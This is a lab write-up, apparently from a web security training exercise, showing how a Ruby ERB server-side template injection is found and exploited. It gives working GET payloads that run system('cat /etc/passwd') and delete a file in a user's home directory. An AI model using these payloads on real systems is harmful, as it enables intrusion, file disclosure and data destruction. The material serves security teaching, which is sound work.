# Basic Server-Side Template Injection

This lab is exploitable through server-side template injection because of how an ERB template is built unsafely.

**Goal:** Consult the ERB documentation to figure out how to run arbitrary code, then use that to delete `morale.txt` from Carlos's home directory.

---



<img width="768" height="453" alt="1" src="https://github.com/user-attachments/assets/6be3006f-3ddc-46ab-aa63-c9a1aa3b966c" />


---

The initial post triggers an error:

<img width="840" height="516" alt="2" src="https://github.com/user-attachments/assets/1fef414c-5455-44a8-83fa-457c395bb9a0" />


This happens via a GET request that controls the message displayed:

<img width="948" height="467" alt="3" src="https://github.com/user-attachments/assets/55d64fa0-298b-402d-94e6-7a4aa8c18f03" />


I tried sending the URL-encoded form of this example payload:

```
<%
                import os
                x=os.popen('id').read()
                %>
                ${x}
```

```
GET /?message=%3c%25%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%6d%70%6f%72%74%20%6f%73%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%78%3d%6f%73%2e%70%6f%70%65%6e%28%27%69%64%27%29%2e%72%65%61%64%28%29%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%25%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%7b%78%7d
```

This produced the following error:

<img width="504" height="121" alt="4" src="https://github.com/user-attachments/assets/3d5eebfc-4c5c-4bf3-899e-21d703a72b9e" />


The TrustedSec blog post on Ruby ERB template injection (https://www.trustedsec.com/blog/rubyerb-template-injection/) has relevant details:

```
GET /?message=<%=+4*4+%>
```

<img width="1054" height="454" alt="5" src="https://github.com/user-attachments/assets/61f347b0-9899-49ed-8b06-8f649d5fa862" />


Arbitrary command execution turns out to be achievable with a payload like this:

```
GET /?message=<%=+system('cat+/etc/passwd')+%>

GET /?message=<%=+system('rm+/home/carlos/morale.txt')+%>
```

<img width="1055" height="444" alt="6" src="https://github.com/user-attachments/assets/fbd51939-77be-4c0a-af56-d18395b156de" />

<img width="1054" height="455" alt="7" src="https://github.com/user-attachments/assets/3e36650c-dbec-404a-bad8-475b7f26fc90" />

